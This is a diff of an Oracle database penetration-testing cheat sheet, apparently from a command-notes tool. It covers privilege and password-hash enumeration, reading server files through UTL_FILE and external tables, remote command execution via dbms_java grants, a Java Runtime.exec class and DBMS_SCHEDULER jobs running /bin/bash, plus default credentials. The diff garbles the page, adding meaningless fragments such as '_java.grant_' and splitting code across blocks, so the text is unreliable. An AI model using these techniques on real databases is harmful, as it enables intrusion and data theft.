@@ -3,7 +3,7 @@ id: "d17eku6armptlaq7n"
 title: "oracle"
 description: ""
 tags: []
-order: 15
+order: "15"
 createdAt: "2026-05-31T09:41:00.083Z"
 updatedAt: "2026-05-31T09:41:51.860Z"
 ---
@@ -278,6 +278,8 @@ SELECT user FROM dual;
 SELECT username, account_status, created FROM dba_users;
 ```
 
+_status, created FROM dba_
+
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"jhmgc8wtgmptlbtgu","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
 
@@ -293,6 +295,8 @@ SELECT username, account_status, created FROM dba_users;
 ```bash
 SELECT username FROM dba_role_privs WHERE granted_role='DBA';
 ```
+
+_role_
 
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"zeen1qj8tmptlbth4","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
@@ -318,6 +322,8 @@ SELECT * FROM session_privs;
 SELECT * FROM user_sys_privs;
 ```
 
+_sys_
+
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"0b3nfbunnmptlbthm","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
 
@@ -334,6 +340,8 @@ SELECT * FROM user_sys_privs;
 SELECT owner, table_name FROM dba_tables;
 ```
 
+_name FROM dba_
+
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"4pfhdlqpemptlbthy","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
 
@@ -341,6 +349,8 @@ SELECT owner, table_name FROM dba_tables;
 ```bash
 SELECT table_name FROM user_tables;
 ```
+
+_name FROM user_
 
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"9h22swwwlmptlbti4","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
@@ -390,6 +400,8 @@ SELECT name, password, spare4 FROM sys.user$; -- all versions
 SELECT * FROM dba_db_links;
 ```
 
+_db_
+
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"oujrfdm6xmptlbtj2","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
 
@@ -397,6 +409,8 @@ SELECT * FROM dba_db_links;
 ```bash
 SELECT * FROM all_db_links;
 ```
+
+_db_
 
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"okpm42v6smptlbtj9","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
@@ -414,6 +428,8 @@ SELECT * FROM all_db_links;
 SELECT directory_name, directory_path FROM dba_directories;
 ```
 
+_name, directory_
+
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"xxt7rkwuomptlbtjk","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
 
@@ -430,6 +446,8 @@ SELECT directory_name, directory_path FROM dba_directories;
 SELECT owner, job_name, job_type, job_action FROM dba_scheduler_jobs;
 ```
 
+_name, job_
+
 **Tags:** oracle, enumeration, authenticated, dba
 <!-- cmd: {"id":"ozn541faimptlbtjw","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->
 
@@ -441,7 +459,7 @@ SELECT owner, job_name, job_type, job_action FROM dba_scheduler_jobs;
 -- Read file via UTL_FILE (requires EXECUTE privilege)
 ```
 
-_File Read (UTL_FILE)_
+_File Read (UTL_
 
 **Tags:** oracle, fileread, utlfile, exploitation
 <!-- cmd: {"id":"6651j2gp6mptlbtkl","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->
@@ -456,15 +474,17 @@ DECLARE
 
 ### e1jjftfl6mptlbtky
 ```bash
-  v_file UTL_FILE.FILE_TYPE;
+v_file UTL_FILE.FILE_TYPE;
 ```
+
+_file UTL_
 
 **Tags:** oracle, fileread, utlfile, exploitation
 <!-- cmd: {"id":"e1jjftfl6mptlbtky","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->
 
 ### ku8f6ptromptlbtl3
 ```bash
-  v_line VARCHAR2(4000);
+v_line VARCHAR2(4000);
 ```
 
 **Tags:** oracle, fileread, utlfile, exploitation
@@ -480,15 +500,17 @@ BEGIN
 
 ### qkz0nh62mmptlbtlg
 ```bash
-  v_file := UTL_FILE.FOPEN('DIRECTORY_NAME', 'filename.txt', 'R');
+v_file := UTL_FILE.FOPEN('DIRECTORY_NAME', 'filename.txt', 'R');
 ```
+
+_file := UTL_
 
 **Tags:** oracle, fileread, utlfile, exploitation
 <!-- cmd: {"id":"qkz0nh62mmptlbtlg","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->
 
 ### 52m29r5gtmptlbtlm
 ```bash
-  LOOP
+LOOP
 ```
 
 **Tags:** oracle, fileread, utlfile, exploitation
@@ -496,23 +518,27 @@ BEGIN
 
 ### d8wlczxvkmptlbtlr
 ```bash
-    UTL_FILE.GET_LINE(v_file, v_line);
+UTL_FILE.GET_LINE(v_file, v_line);
 ```
+
+_FILE.GET_
 
 **Tags:** oracle, fileread, utlfile, exploitation
 <!-- cmd: {"id":"d8wlczxvkmptlbtlr","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->
 
 ### xoztcbohcmptlbtly
 ```bash
-    DBMS_OUTPUT.PUT_LINE(v_line);
+DBMS_OUTPUT.PUT_LINE(v_line);
 ```
+
+_OUTPUT.PUT_
 
 **Tags:** oracle, fileread, utlfile, exploitation
 <!-- cmd: {"id":"xoztcbohcmptlbtly","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->
 
 ### ulteu46u6mptlbtm6
 ```bash
-  END LOOP;
+END LOOP;
 ```
 
 **Tags:** oracle, fileread, utlfile, exploitation
@@ -520,8 +546,10 @@ BEGIN
 
 ### kceokzjlhmptlbtmb
 ```bash
-  EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(v_file);
+EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(v_file);
 ```
+
+_DATA_
 
 **Tags:** oracle, fileread, utlfile, exploitation
 <!-- cmd: {"id":"kceokzjlhmptlbtmb","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->
@@ -584,15 +612,17 @@ CREATE TABLE etc_passwd (line VARCHAR2(4000)) ORGANIZATION EXTERNAL (
 
 ### 69awvzas3mptlbtnj
 ```bash
-  TYPE oracle_loader DEFAULT DIRECTORY tmp_dir
+TYPE oracle_loader DEFAULT DIRECTORY tmp_dir
 ```
+
+_loader DEFAULT DIRECTORY tmp_
 
 **Tags:** oracle, fileread, utlfile, exploitation
 <!-- cmd: {"id":"69awvzas3mptlbtnj","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->
 
 ### aere1pns8mptlbtnq
 ```bash
-  ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE FIELDS (line CHAR(4000)))
+ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE FIELDS (line CHAR(4000)))
 ```
 
 **Tags:** oracle, fileread, utlfile, exploitation
@@ -600,7 +630,7 @@ CREATE TABLE etc_passwd (line VARCHAR2(4000)) ORGANIZATION EXTERNAL (
 
 ### wq6kcw3k5mptlbtnw
 ```bash
-  LOCATION ('passwd')
+LOCATION ('passwd')
 ```
 
 **Tags:** oracle, fileread, utlfile, exploitation
@@ -698,24 +728,30 @@ begin
 
 ### ub3sjd9yfmptlbtqx
 ```bash
-  dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','read,write,execute,delete');
+dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','read,write,execute,delete');
 ```
+
+_java.grant_
 
 **Tags:** oracle, rce, java, exploitation
 <!-- cmd: {"id":"ub3sjd9yfmptlbtqx","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->
 
 ### htrb1qqh2mptlbtr2
 ```bash
-  dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','writeFileDescriptor','');
+dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','writeFileDescriptor','');
 ```
+
+_java.grant_
 
 **Tags:** oracle, rce, java, exploitation
 <!-- cmd: {"id":"htrb1qqh2mptlbtr2","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->
 
 ### gn0i02464mptlbtr8
 ```bash
-  dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','readFileDescriptor','');
+dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','readFileDescriptor','');
 ```
+
+_java.grant_
 
 **Tags:** oracle, rce, java, exploitation
 <!-- cmd: {"id":"gn0i02464mptlbtr8","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->
@@ -762,7 +798,7 @@ public class RCE {
 
 ### fsdt6vifhmptlbts5
 ```bash
-  public static String exec(String cmd) throws Exception {
+public static String exec(String cmd) throws Exception {
 ```
 
 **Tags:** oracle, rce, java, exploitation
@@ -770,7 +806,7 @@ public class RCE {
 
 ### s047tam7xmptlbtsb
 ```bash
-    Process p = Runtime.getRuntime().exec(cmd);
+Process p = Runtime.getRuntime().exec(cmd);
 ```
 
 **Tags:** oracle, rce, java, exploitation
@@ -778,7 +814,7 @@ public class RCE {
 
 ### zvp1qdb8dmptlbtsg
 ```bash
-    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
 ```
 
 **Tags:** oracle, rce, java, exploitation
@@ -786,7 +822,7 @@ public class RCE {
 
 ### 7cqcqpywdmptlbtsm
 ```bash
-    String l, out = "";
+String l, out = "";
 ```
 
 **Tags:** oracle, rce, java, exploitation
@@ -794,7 +830,7 @@ public class RCE {
 
 ### cbgo58ucbmptlbtss
 ```bash
-    while((l=r.readLine())!=null) out += l + "\n";
+while((l=r.readLine())!=null) out += l + "\n";
 ```
 
 **Tags:** oracle, rce, java, exploitation
@@ -802,7 +838,7 @@ public class RCE {
 
 ### rn5w0xyc7mptlbtsx
 ```bash
-    return out;
+return out;
 ```
 
 **Tags:** oracle, rce, java, exploitation
@@ -810,7 +846,7 @@ public class RCE {
 
 ### wh7kjssqxmptlbtt4
 ```bash
-  }
+}
 ```
 
 **Tags:** oracle, rce, java, exploitation
@@ -864,7 +900,7 @@ SELECT rce('id') FROM dual;
 -- Execute OS command via scheduler (DBA privilege)
 ```
 
-_RCE via DBMS_SCHEDULER_
+_RCE via DBMS_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"2cm2lauy2mptlbtuq","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
@@ -879,23 +915,27 @@ BEGIN
 
 ### 3grvmm0m7mptlbtv2
 ```bash
-  DBMS_SCHEDULER.CREATE_JOB(
+DBMS_SCHEDULER.CREATE_JOB(
 ```
+
+_SCHEDULER.CREATE_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"3grvmm0m7mptlbtv2","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
 
 ### qfd81mbqymptlbtv7
 ```bash
-    job_name => 'EXEC_CMD',
+job_name => 'EXEC_CMD',
 ```
+
+_name => 'EXEC_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"qfd81mbqymptlbtv7","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
 
 ### yr3nuncnsmptlbtvd
 ```bash
-    job_type => 'EXECUTABLE',
+job_type => 'EXECUTABLE',
 ```
 
 **Tags:** oracle, rce, scheduler, exploitation
@@ -903,7 +943,7 @@ BEGIN
 
 ### 8cbnuwytvmptlbtvi
 ```bash
-    job_action => '/bin/bash',
+job_action => '/bin/bash',
 ```
 
 **Tags:** oracle, rce, scheduler, exploitation
@@ -911,15 +951,17 @@ BEGIN
 
 ### 5xlreoxx1mptlbtvo
 ```bash
-    number_of_arguments => 3,
+number_of_arguments => 3,
 ```
+
+_of_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"5xlreoxx1mptlbtvo","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
 
 ### vy0fiklvqmptlbtvv
 ```bash
-    enabled => FALSE
+enabled => FALSE
 ```
 
 **Tags:** oracle, rce, scheduler, exploitation
@@ -927,7 +969,7 @@ BEGIN
 
 ### ljm3cppk9mptlbtw0
 ```bash
-  );
+);
 ```
 
 **Tags:** oracle, rce, scheduler, exploitation
@@ -935,32 +977,40 @@ BEGIN
 
 ### 57gpbg75lmptlbtw5
 ```bash
-  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD',1,'-c');
+DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD',1,'-c');
 ```
+
+_SCHEDULER.SET_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"57gpbg75lmptlbtw5","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
 
 ### wi5m26dmdmptlbtwa
 ```bash
-  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD',2,'id > /tmp/pwned.txt');
+DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('EXEC_CMD',2,'id > /tmp/pwned.txt');
 ```
+
+_SCHEDULER.SET_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"wi5m26dmdmptlbtwa","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
 
 ### 7tchabtfumptlbtwg
 ```bash
-  DBMS_SCHEDULER.ENABLE('EXEC_CMD');
+DBMS_SCHEDULER.ENABLE('EXEC_CMD');
 ```
+
+_SCHEDULER.ENABLE('EXEC_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"7tchabtfumptlbtwg","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
 
 ### 7gxnci3yxmptlbtwm
 ```bash
-  DBMS_SCHEDULER.RUN_JOB('EXEC_CMD');
+DBMS_SCHEDULER.RUN_JOB('EXEC_CMD');
 ```
+
+_SCHEDULER.RUN_
 
 **Tags:** oracle, rce, scheduler, exploitation
 <!-- cmd: {"id":"7gxnci3yxmptlbtwm","language":"bash","sectionId":"4peudmpr0mptlbt8z","tags":["oracle","rce","scheduler","exploitation"]} -->
@@ -1070,6 +1120,8 @@ python3 odat.py privesc -s $TARGET -d $SID -U $USER -P $PASS
 ```bash
 SELECT object_name, object_type FROM all_objects WHERE owner='SYS' AND object_type='PACKAGE BODY';
 ```
+
+_name, object_
 
 **Tags:** oracle, privesc, exploitation
 <!-- cmd: {"id":"3pefjokk8mptlbtzd","language":"bash","sectionId":"wliyjtm3hmptlbt97","tags":["oracle","privesc","exploitation"]} -->
@@ -1238,7 +1290,7 @@ lsnrctl services $TARGET
 sys      : change_on_install
 ```
 
-_Default Credentials_
+_on_
 
 **Tags:** oracle, default-credentials
 <!-- cmd: {"id":"c2g9fr1ummptlbu4g","language":"bash","sectionId":"l47lrj5a2mptlbt9x","tags":["oracle","default-credentials"]} -->
